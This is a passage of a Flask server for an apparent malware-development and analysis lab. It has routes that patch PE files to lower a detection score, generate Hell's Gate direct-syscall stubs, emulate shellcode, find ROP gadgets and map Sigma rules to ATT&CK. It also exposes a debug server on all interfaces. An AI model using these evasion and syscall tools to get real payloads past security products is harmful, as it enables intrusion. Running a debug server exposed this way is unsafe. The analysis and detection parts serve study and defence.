    allowed_patches = {
        "timestamp", "fake_timestamp", "rich_header", "debug_dir",
        "section_rename", "checksum", "dos_stub", "stomp_dos_header",
        "entropy_padding", "set_aslr_dep", "clear_high_entropy_va",
        "flip_subsystem", "stomp_rwx_flags", "spoof_imagebase",
        "wipe_overlay", "zero_bound_imports", "zero_load_config",
        "zero_exports", "zero_security_dir",
    }
    patch_ids = [p for p in patch_ids if p in allowed_patches]

    score_before = 0
    try:
        score_before = _evasion.analyse(raw, out_name).get("score", 0)
    except Exception:
        pass

    patched, applied = _evasion.apply_patches(raw, patch_ids)

    try:
        _db.save_patch_run(
            filename=out_name,
            orig_size=len(raw),
            patch_size=len(patched),
            patches=patch_ids,
            applied=applied,
            score=score_before,
        )
    except Exception:
        pass

    return Response(
        patched,
        mimetype="application/octet-stream",
        headers={
            "Content-Disposition": f'attachment; filename="{out_name}"',
            "X-Patches-Applied":   "; ".join(applied).encode("ascii", "replace").decode("ascii"),
        }
    )


@app.route("/api/evasion/history", methods=["GET"])
def api_evasion_history():
    limit = min(int(request.args.get("limit", 10)), 50)
    return jsonify(_db.get_patch_history(limit))


# -- Artifact Map (Sigma -> ATT&CK technique artifacts) -------------------------

try:
    import artifact_parser as _artifact_parser
    HAS_ARTIFACT = True
except ImportError:
    HAS_ARTIFACT = False

_SIGMA_DIR = Path.home() / "hacking" / "sigma"


@app.route("/api/artifacts")
def api_artifacts():
    tactic = request.args.get("tactic", "all").strip()
    q      = request.args.get("q", "").strip()
    if _db.count_artifact_entries() == 0:
        return jsonify([])
    return jsonify(_db.get_artifact_entries(tactic, q))


@app.route("/api/artifacts/stats")
def api_artifacts_stats():
    if _db.count_artifact_entries() == 0:
        return jsonify({
            "total_techniques": 0, "total_rules": 0,
            "unique_tactics": 0, "unique_event_ids": 0,
            "tactics": [], "built": False,
        })
    stats = _db.get_artifact_stats()
    stats["built"] = True
    return jsonify(stats)


@app.route("/api/artifacts/<tid>")
def api_artifact_entry(tid: str):
    entry = _db.get_artifact_entry(tid)
    if not entry:
        return jsonify({"error": "not found"}), 404
    return jsonify(entry)


@app.route("/api/artifacts/rebuild")
def api_artifacts_rebuild():
    """SSE stream: parse Sigma rules and populate artifact_map table."""
    if not HAS_ARTIFACT:
        return jsonify({"error": "artifact_parser module not available"}), 503

    def generate():
        def evt(status: str, msg: str, **kw):
            obj = {"status": status, "msg": msg, **kw}
            return f"data: {json.dumps(obj)}\n\n"

        sigma_path = _SIGMA_DIR
        if not sigma_path.exists():
            yield evt("error", f"sigma dir not found: {sigma_path}")
            yield "data: [DONE]\n\n"
            return

        yield evt("running", f"scanning {sigma_path} …")

        last_progress = [0]

        def progress(current: int, total: int, filename: str):
            last_progress[0] = current
            # don't yield from inside a callback in a generator - collect instead
            pass

        try:
            entries = _artifact_parser.build_artifact_map(sigma_path, progress)
            _db.save_artifact_entries(entries)
            stats = _db.get_artifact_stats()
            yield evt("done",
                      f"built artifact map: {stats['total_techniques']} techniques "
                      f"from {stats['total_rules']} Sigma rules",
                      stats=stats)
        except Exception as e:
            yield evt("error", str(e))

        yield "data: [DONE]\n\n"

    return Response(
        stream_with_context(generate()),
        content_type="text/event-stream",
        headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"},
    )


# -- Shellcode Emulator -------------------------------------------------------

@app.route("/api/scemu/run", methods=["POST"])
def api_scemu_run():
    """Emulate shellcode bytes; accepts multipart (file) or JSON (hex/base64)."""
    arch      = "x64"
    max_insns = 5000
    raw: bytes | None = None

    if "file" in request.files:
        raw  = request.files["file"].read()
        arch = request.form.get("arch", "x64")
        try:
            max_insns = int(request.form.get("max_insns", 5000))
        except ValueError:
            pass
    else:
        data = request.get_json(force=True) or {}
        arch = data.get("arch", "x64")
        try:
            max_insns = int(data.get("max_insns", 5000))
        except (ValueError, TypeError):
            pass
        hex_str = data.get("hex", "").replace(" ", "").replace("\n", "")
        b64_str = data.get("base64", "")
        if hex_str:
            try:
                raw = bytes.fromhex(hex_str)
            except ValueError as exc:
                return jsonify({"ok": False, "error": f"invalid hex: {exc}"}), 400
        elif b64_str:
            import base64 as _b64
            try:
                raw = _b64.b64decode(b64_str)
            except Exception as exc:
                return jsonify({"ok": False, "error": f"invalid base64: {exc}"}), 400

    if not raw:
        return jsonify({"ok": False, "error": "no shellcode provided"}), 400
    if len(raw) > 2 * 1024 * 1024:
        return jsonify({"ok": False, "error": "shellcode too large (max 2 MB)"}), 400
    if arch not in ("x86", "x64"):
        return jsonify({"ok": False, "error": "arch must be 'x86' or 'x64'"}), 400
    max_insns = min(max(100, max_insns), 50_000)

    try:
        from sc_emulator import emulate as _sc_emu
        return jsonify(_sc_emu(raw, arch, max_insns))
    except Exception as exc:
        return jsonify({"ok": False, "error": str(exc)}), 500


@app.route("/api/scemu/disasm", methods=["POST"])
def api_scemu_disasm():
    """Pure Capstone disassembly - no execution."""
    raw: bytes | None = None
    arch = "x64"

    if "file" in request.files:
        raw  = request.files["file"].read()
        arch = request.form.get("arch", "x64")
    else:
        data = request.get_json(force=True) or {}
        arch = data.get("arch", "x64")
        hex_str = data.get("hex", "").replace(" ", "").replace("\n", "")
        if hex_str:
            try:
                raw = bytes.fromhex(hex_str)
            except ValueError as exc:
                return jsonify({"ok": False, "error": f"invalid hex: {exc}"}), 400

    if not raw:
        return jsonify({"ok": False, "error": "no bytes provided"}), 400
    if arch not in ("x86", "x64"):
        return jsonify({"ok": False, "error": "arch must be 'x86' or 'x64'"}), 400

    try:
        import capstone as cs
        mode = cs.CS_MODE_64 if arch == "x64" else cs.CS_MODE_32
        md   = cs.Cs(cs.CS_ARCH_X86, mode)
        insns = []
        for i in md.disasm(raw[:4096], 0):
            insns.append({
                "offset": hex(i.address),
                "bytes":  i.bytes.hex(" "),
                "mnem":   i.mnemonic,
                "ops":    i.op_str,
            })
        return jsonify({"ok": True, "arch": arch, "count": len(insns), "insns": insns})
    except Exception as exc:
        return jsonify({"ok": False, "error": str(exc)}), 500


# ---------------------------------------------------------------------------
# PE Inspector
# ---------------------------------------------------------------------------

@app.route("/api/pe/analyse", methods=["POST"])
def api_pe_analyse():
    """Analyse an uploaded PE binary and return full anatomy report."""
    if "file" not in request.files:
        return jsonify({"error": "no file uploaded"}), 400
    f    = request.files["file"]
    raw  = f.read()
    if not raw:
        return jsonify({"error": "empty file"}), 400
    try:
        from pe_inspector import analyze as _pe_analyze
        result = _pe_analyze(raw)
        result["file_name"] = f.filename or "upload"
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/pe/analyse/session", methods=["POST"])
def api_pe_analyse_session():
    """Analyse a PE from a compiled session sample."""
    data = request.get_json(force=True) or {}
    session_id = data.get("session_id", "").strip()
    filename   = data.get("filename",   "").strip()
    if not session_id or not filename:
        return jsonify({"ok": False, "error": "session_id and filename required"}), 400
    filepath = (SAMPLES_DIR / session_id / filename).resolve()
    if not str(filepath).startswith(str(SAMPLES_DIR.resolve())):
        return jsonify({"ok": False, "error": "invalid path"}), 400
    if not filepath.exists():
        return jsonify({"ok": False, "error": "file not found"}), 404
    try:
        from pe_inspector import analyze as _pe_analyze
        return jsonify(_pe_analyze(filepath))
    except Exception as e:
        return jsonify({"ok": False, "error": str(e)}), 500


@app.route("/api/pe/analyse/build", methods=["POST"])
def api_pe_analyse_build():
    """Analyse a PE from a compiled build binary."""
    data     = request.get_json(force=True) or {}
    build_id = data.get("build_id", "").strip()
    if not build_id:
        return jsonify({"ok": False, "error": "build_id required"}), 400
    job = _build_mgr.get(build_id) or {}
    if not job or job.get("status") != "success":
        return jsonify({"ok": False, "error": "build not found or not successful"}), 404
    p = _resolve_build_binary(job)
    if not p:
        return jsonify({"ok": False, "error": "binary not found on disk"}), 404
    fname = data.get("fname", "").strip()
    if fname and fname != p.name:
        if "/" in fname or "\\" in fname or not fname.lower().endswith(".exe"):
            return jsonify({"ok": False, "error": "invalid fname"}), 400
        alt = p.parent / fname
        if not alt.exists():
            return jsonify({"ok": False, "error": f"{fname} not found on disk"}), 404
        p = alt
    try:
        from pe_inspector import analyze as _pe_analyze
        return jsonify(_pe_analyze(p))
    except Exception as e:
        return jsonify({"ok": False, "error": str(e)}), 500


# -- Hell's Gate / Direct Syscall Lab ----------------------------------------

_HG_UPLOAD_DIR: Path = BASE_DIR / "data" / "hellsgate"
_HG_UPLOAD_DIR.mkdir(parents=True, exist_ok=True)


@app.route("/api/hellsgate/scan", methods=["POST"])
def api_hellsgate_scan():
    """Accept an ntdll.dll upload (or reuse the last one) and return SSN table."""
    ntdll_path = _HG_UPLOAD_DIR / "ntdll.dll"

    if "file" in request.files:
        f = request.files["file"]
        if not f.filename:
            return jsonify({"ok": False, "error": "empty filename"}), 400
        f.save(str(ntdll_path))
    elif not ntdll_path.exists():
        return jsonify({"ok": False,
                        "error": "no ntdll.dll on server - upload one first"}), 400

    try:
        from hellsgate import scan as _hg_scan
        return jsonify(_hg_scan(ntdll_path))
    except Exception as exc:
        return jsonify({"ok": False, "error": str(exc)}), 500


@app.route("/api/hellsgate/generate", methods=["POST"])
def api_hellsgate_generate():
    """Generate NASM / C direct-syscall stubs for the selected functions."""
    data      = request.get_json(force=True) or {}
    functions = data.get("functions", [])
    language  = data.get("language", "nasm")   # "nasm" | "c"

    if not functions:
        return jsonify({"ok": False, "error": "no functions provided"}), 400
    if language not in ("nasm", "c"):
        return jsonify({"ok": False, "error": "language must be 'nasm' or 'c'"}), 400

    try:
        from hellsgate import generate_asm as _hg_gen
        code = _hg_gen(functions, language)
        return jsonify({"ok": True, "code": code, "count": len(functions),
                        "language": language})
    except Exception as exc:
        return jsonify({"ok": False, "error": str(exc)}), 500


# -- Anti-Analysis Pattern Scanner -------------------------------------------

@app.route("/api/antianalysis/scan", methods=["POST"])
def api_antianalysis_scan():
    """Scan a PE or raw binary for anti-debug/anti-VM patterns."""
    try:
        from anti_analysis import scan_pe as _aa_pe, scan_raw as _aa_raw
    except Exception as exc:
        return jsonify({"ok": False, "error": str(exc)}), 500

    arch = (request.form.get("arch") or
            (request.get_json(force=True, silent=True) or {}).get("arch", "auto"))
    if arch not in ("auto", "x64", "x86"):
        arch = "auto"

    # --- upload ---
    if "file" in request.files:
        f = request.files["file"]
        if not f.filename:
            return jsonify({"ok": False, "error": "empty filename"}), 400
        raw = f.read()
        if not raw:
            return jsonify({"ok": False, "error": "empty file"}), 400
        # try as PE first, fall back to raw
        import tempfile, os
        tmp = tempfile.NamedTemporaryFile(delete=False, suffix=".bin")
        tmp.write(raw); tmp.close()
        try:
            result = _aa_pe(Path(tmp.name), arch=arch)
            if not result["ok"]:
                result = _aa_raw(raw, arch="x64" if arch == "auto" else arch)
        finally:
            os.unlink(tmp.name)
        result["file_name"] = f.filename
        return jsonify(result)

    # --- JSON: session source ---
    data = request.get_json(force=True, silent=True) or {}
    source = data.get("source", "")

    if source == "session":
        session_id = data.get("session_id", "").strip()
        filename   = data.get("filename",   "").strip()
        if not session_id or not filename:
            return jsonify({"ok": False, "error": "session_id and filename required"}), 400
        filepath = (SAMPLES_DIR / session_id / filename).resolve()
        if not str(filepath).startswith(str(SAMPLES_DIR.resolve())):
            return jsonify({"ok": False, "error": "invalid path"}), 400
        if not filepath.exists():
            return jsonify({"ok": False, "error": "file not found"}), 404
        result = _aa_pe(filepath, arch=arch)
        if not result["ok"]:
            result = _aa_raw(filepath.read_bytes(), arch="x64" if arch == "auto" else arch)
        result["file_name"] = filename
        return jsonify(result)

    if source == "build":
        build_id = data.get("build_id", "").strip()
        if not build_id:
            return jsonify({"ok": False, "error": "build_id required"}), 400
        job = _build_mgr.get(build_id) or {}
        if not job or job.get("status") != "success":
            return jsonify({"ok": False, "error": "build not found or not successful"}), 404
        p = _resolve_build_binary(job)
        if not p:
            return jsonify({"ok": False, "error": "binary not found on disk"}), 404
        fname = data.get("fname", "").strip()
        if fname and fname != p.name:
            if "/" in fname or "\\" in fname:
                return jsonify({"ok": False, "error": "invalid fname"}), 400
            alt = p.parent / fname
            if alt.exists():
                p = alt
        result = _aa_pe(p, arch=arch)
        if not result["ok"]:
            result = _aa_raw(p.read_bytes(), arch="x64" if arch == "auto" else arch)
        result["file_name"] = p.name
        return jsonify(result)

    return jsonify({"ok": False, "error": "provide a file upload or source+session_id/build_id"}), 400


# -- ROP Chain Builder --------------------------------------------------------

def _rop_parse_params(data: dict):
    arch       = data.get("arch", "auto")
    if arch not in ("auto", "x64", "x86"):
        arch = "auto"
    base_str   = str(data.get("image_base", "")).strip()
    image_base = None
    if base_str:
        try:
            image_base = int(base_str, 16) if base_str.startswith("0x") else int(base_str, 0)
        except ValueError:
            pass
    return arch, image_base


@app.route("/api/rop/scan", methods=["POST"])
def api_rop_scan():
    """Find ROP gadgets in an uploaded PE/DLL or raw binary."""
    try:
        from rop_builder import scan_pe as _rop_pe, scan_raw as _rop_raw
    except Exception as exc:
        return jsonify({"ok": False, "error": str(exc)}), 500

    # --- file upload ---
    if "file" in request.files:
        f = request.files["file"]
        if not f.filename:
            return jsonify({"ok": False, "error": "empty filename"}), 400
        raw = f.read()
        if not raw:
            return jsonify({"ok": False, "error": "empty file"}), 400
        arch_str   = request.form.get("arch", "auto")
        base_str   = request.form.get("image_base", "").strip()
        image_base = None
        if base_str:
            try:
                image_base = int(base_str, 16) if base_str.startswith("0x") else int(base_str, 0)
            except ValueError:
                pass
        if arch_str not in ("auto", "x64", "x86"):
            arch_str = "auto"
        import tempfile, os
        tmp = tempfile.NamedTemporaryFile(delete=False, suffix=".bin")
        tmp.write(raw); tmp.close()
        try:
            result = _rop_pe(Path(tmp.name), arch=arch_str, image_base=image_base)
            if not result["ok"]:
                result = _rop_raw(raw,
                                  arch="x64" if arch_str == "auto" else arch_str,
                                  image_base=image_base or 0x400000)
        finally:
            os.unlink(tmp.name)
        result["file_name"] = f.filename
        return jsonify(result)

    # --- JSON: session / build source ---
    data = request.get_json(force=True, silent=True) or {}
    arch, image_base = _rop_parse_params(data)
    source = data.get("source", "")

    if source == "session":
        session_id = data.get("session_id", "").strip()
        filename   = data.get("filename",   "").strip()
        if not session_id or not filename:
            return jsonify({"ok": False, "error": "session_id and filename required"}), 400
        filepath = (SAMPLES_DIR / session_id / filename).resolve()
        if not str(filepath).startswith(str(SAMPLES_DIR.resolve())):
            return jsonify({"ok": False, "error": "invalid path"}), 400
        if not filepath.exists():
            return jsonify({"ok": False, "error": "file not found"}), 404
        result = _rop_pe(filepath, arch=arch, image_base=image_base)
        if not result["ok"]:
            result = _rop_raw(filepath.read_bytes(),
                              arch="x64" if arch == "auto" else arch,
                              image_base=image_base or 0x400000)
        result["file_name"] = filename
        return jsonify(result)

    if source == "build":
        build_id = data.get("build_id", "").strip()
        if not build_id:
            return jsonify({"ok": False, "error": "build_id required"}), 400
        job = _build_mgr.get(build_id) or {}
        if not job or job.get("status") != "success":
            return jsonify({"ok": False, "error": "build not found or not successful"}), 404
        p = _resolve_build_binary(job)
        if not p:
            return jsonify({"ok": False, "error": "binary not found on disk"}), 404
        fname = data.get("fname", "").strip()
        if fname and fname != p.name:
            if "/" in fname or "\\" in fname:
                return jsonify({"ok": False, "error": "invalid fname"}), 400
            alt = p.parent / fname
            if alt.exists():
                p = alt
        result = _rop_pe(p, arch=arch, image_base=image_base)
        if not result["ok"]:
            result = _rop_raw(p.read_bytes(),
                              arch="x64" if arch == "auto" else arch,
                              image_base=image_base or 0x400000)
        result["file_name"] = p.name
        return jsonify(result)

    return jsonify({"ok": False, "error": "provide a file upload or source+session_id/build_id"}), 400


if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=5000)
